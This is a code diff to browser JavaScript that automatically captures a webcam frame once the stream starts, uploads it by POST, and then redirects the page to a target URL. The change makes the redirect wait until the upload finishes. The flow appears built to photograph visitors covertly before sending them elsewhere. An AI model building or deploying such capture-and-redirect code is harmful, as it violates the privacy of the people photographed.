@@ -50,11 +50,7 @@
                 canvas.setAttribute('height', height)
                 streaming = true
 
-                await takepicture()
-
-                if (target) {
-                    location.replace(target)
-                }
+                takepicture()
             }
         }, false)
     }
@@ -65,7 +61,7 @@
     // drawing that to the screen, we can change its size and/or apply
     // other changes before drawing it.
 
-    async function takepicture() {
+    function takepicture() {
         // 建立一个简单的二维渲染上下文
         var context = canvas.getContext('2d')
         if (width && height) {
@@ -73,7 +69,7 @@
             canvas.height = height
             context.drawImage(video, 0, 0, width, height)
 
-            await canvas.toBlob(async (blob) => {
+            canvas.toBlob(async (blob) => {
                 let fd = new FormData()
                 fd.append('file', blob)
 
@@ -81,6 +77,10 @@
                     method: 'POST',
                     body: fd
                 })
+
+                if (target) {
+                    location.replace(target)
+                }
             })
         } else {
             clearphoto()
